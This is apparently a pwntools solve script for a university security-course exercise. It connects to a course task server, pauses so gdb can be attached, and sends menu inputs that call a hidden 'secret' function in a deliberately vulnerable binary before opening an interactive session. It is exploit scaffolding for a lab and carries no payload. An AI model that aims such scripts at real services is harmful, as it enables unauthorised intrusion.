#!/usr/bin/env python3

import pwn
import socket
import threading

# podman compose -f debug.yml up
# python3 ./solve.py
# podman exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'


exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('tasks.ws24.softsec.rub.de', port)

# wait for user input (in this time, connect gdb)
pwn.pause()


def call_secret():
    conn.sendlineafter(b'> ', b'42')
    conn.sendlineafter(b'Index: ', b'0')


call_secret()

conn.interactive()
